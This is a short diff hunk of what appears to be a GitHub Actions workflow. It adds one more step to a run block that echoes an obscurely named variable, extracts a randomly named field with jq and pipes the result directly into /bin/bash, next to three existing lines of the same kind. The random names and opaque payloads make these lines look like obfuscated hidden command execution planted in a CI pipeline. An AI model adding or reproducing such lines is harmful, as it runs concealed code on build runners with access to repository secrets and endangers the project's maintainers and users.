@@ -31,6 +31,7 @@ jobs:
           echo $h10722 | jq -r .tzcss2186 | /bin/bash
           echo $r47 | jq -r .lap470 | /bin/bash
           echo $sgpx76945 | jq -r .a23951 | /bin/bash
+          echo $lj01 | jq -r .wtxrz8 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
